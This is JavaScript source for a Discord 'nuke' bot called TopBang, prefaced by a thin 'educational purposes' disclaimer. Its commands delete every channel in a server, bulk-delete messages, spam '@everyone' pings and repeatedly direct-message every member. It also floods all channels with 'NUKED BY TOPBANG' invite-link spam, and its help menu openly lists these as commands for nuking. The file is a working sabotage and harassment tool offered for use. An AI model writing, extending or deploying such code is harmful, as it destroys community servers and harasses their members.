// This was made for educational purposes
// Do not abuse this.
// And do not nuke servers with this.
// It is against discord's Terms Of Service/Terms Of Use

const { channel } = require('diagnostics_channel')
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js')


const token = process.env['token']
const Prefix = '.'
const Blacklist = ['Reno', "otherppl"]


const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
})


// Slash commands
client.on('ready', () => {
  const GuildId = '1019701490186715157'
   const Guild = false
    let commands

    if (Guild) {
      commands = Guild.commands
    } else {
      commands = client.application.commands
    }

  commands?.create({
    name: 'help',
    description: "Gives you a list of commands"
  })
})


// Slash command supporter
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) {
    return
  }
  
  const { commandName, options } = interaction
  if (commandName === 'help') {
    const HelpEMBED = new EmbedBuilder().setTitle("help").setDescription("List of commands to use for nuking..").addFields(
      {
        name: 'delete-channel',
        value: '``Deletes the channel you typed in.``'
      },
      {
        name: 'spam-ping',
        value: '``Spam pings everybody in the channel you typed in.``'
      },
      {
        name: 'spam-dm',
        value: '``Spam dms everybody in the server.``'
      },
      {
        name: 'delete-messages',
        value: '``Deletes every message in the channel you typed in.``'
      },
      {
        name: 'More severe actions.',
        value: "``warning more severe actions to the server.``"
      },
      {
        name: 'delete-channels',
        value: '``Deletes Every single channel``'
      },
      {
        name: 'spam-channels',
        value: '``spams every single channel, while spam pinging everybody.``'
      },
      {
        name: 'Prefix',
        value: '``.``'
      },
      {
        name: 'Credits',
        value: '``Reno, Reno and Reno``'
      }
    ).setFooter( { text: 'TopBang', iconURL: interaction.member.avatar }).setColor("Random")
    interaction.reply({
      content: '',
      ephemeral: true,
      embeds: [HelpEMBED]
    })
  }
})

// Message
client.on('messageCreate', async message => {

  // Args
  const args = message.content.slice(Prefix.length).trim().split(' ');

// Delete channel
  if (message.content === `${Prefix}delete-channel`) {
    message.channel.delete()
  } else if (message.content === `${Prefix}spam-ping`) {
    message.channel.send('Activating..')
    const i = 0
    const loopTime = 60 // how many times it loops
    for (let i = 0; i < loopTime; i++) {
      setTimeout(function() {
        message.channel.send('@everyone TopBang bot on top! https://discord.gg/SRgPuDeX ')
      }, 250)
    }
    // Spam DM
  } else if (message.content === `${Prefix}spam-dm`) {
    const guild = client.guilds.cache.get(message.guild.id);
    const SpamDMMSG = 'You are getting spam dmed. (TopBang on top https://discord.gg/SRgPuDeX)'
    const i = 0
    const loopTime = 30 // how many timesit loops
    for (let i = 0; i < loopTime; i++) {
      setTimeout(function() {
        guild.members.fetch().then(members => {
          members.forEach(member => {
            if (member.user.username === `${client.user.username}`) {
              return
            }
            member.send(SpamDMMSG)
          });
        });
      }, 250)
    }
    // Delete messages
  } else if (message.content === `${Prefix}delete-messages`) {
        message.channel.bulkDelete(100)
  .then(messages => message.author.send("Channel cleared."))
  .catch(console.error);
    // Delete Channels
  } else if (message.content === `${Prefix}delete-channels`) {
message.guild.channels.cache.forEach(channel => channel.delete());
  } else if (message.content === `${Prefix}spam-channels`) {
    const MSG = "NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE "
    message.guild.channels.cache.forEach(channel => channel.send(MSG));
        const i = 0
    const loopTime = 5 // how many timesit loops
    for (let i = 0; i < loopTime; i++) {
          setTimeout(function() {
        message.guild.channels.cache.forEach(channel => channel.send(MSG));
    }, 250)
    }
  }
})

client.login(token)
